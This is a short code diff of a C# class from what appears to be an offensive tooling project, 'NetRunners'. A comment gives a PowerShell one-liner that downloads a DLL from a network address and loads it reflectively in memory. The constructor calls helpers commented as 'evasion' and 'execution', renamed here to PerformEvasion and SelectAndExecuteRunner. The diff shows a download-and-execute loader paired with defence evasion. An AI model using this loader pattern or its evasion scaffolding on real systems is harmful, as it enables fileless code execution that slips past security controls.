@@ -12,13 +12,12 @@ public class TestClass
     /// You can run this compiled managed DLL using this powershell one-liner:
     /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).CreateInstance('NetRunnersDll.TestClass')
     /// </example>
-
     public TestClass()
     {
         // evasion
-        NetRunners.Helpers.Helper.PerformChecks();
+        NetRunners.Helpers.Helper.PerformEvasion();
         // execution
-        NetRunners.Helpers.Helper.SelectRunner();
+        NetRunners.Helpers.Helper.SelectAndExecuteRunner();
     }
     public void RunProcess(string path)
     {
